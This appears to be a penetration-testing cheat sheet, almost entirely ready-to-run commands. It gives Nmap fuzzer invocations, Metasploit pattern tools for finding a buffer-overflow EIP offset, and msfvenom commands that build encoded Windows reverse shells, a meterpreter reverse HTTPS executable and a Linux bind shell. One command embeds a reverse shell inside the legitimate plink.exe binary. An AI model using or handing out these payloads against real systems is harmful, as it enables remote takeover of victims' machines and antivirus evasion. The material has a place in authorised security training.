# DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)

## NMap Fuzzer List
https://nmap.org/nsedoc/categories/fuzzer.html

## NMap HTTP Form Fuzzer
nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip

## Nmap DNS Fuzzer
nmap --script dns-fuzz --script-args timelimit=2h $ip -d


# Pattern Create and Locate

locate pattern_create
pattern_create.rb -l 2700

locate pattern_offset
pattern_offset.rb -q 39694438

## Verify exact location of EIP - [*] Exact match at offset 2606
buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90


**MSFVenom Payloads**
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

## Create a PE reverse shell and embed it into an existing executable
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

## Create a PE Reverse HTTPS shell
msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe

## Linux Bind Shell on PORT 4444 ( connect with nc -v $ip 4444 )
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai

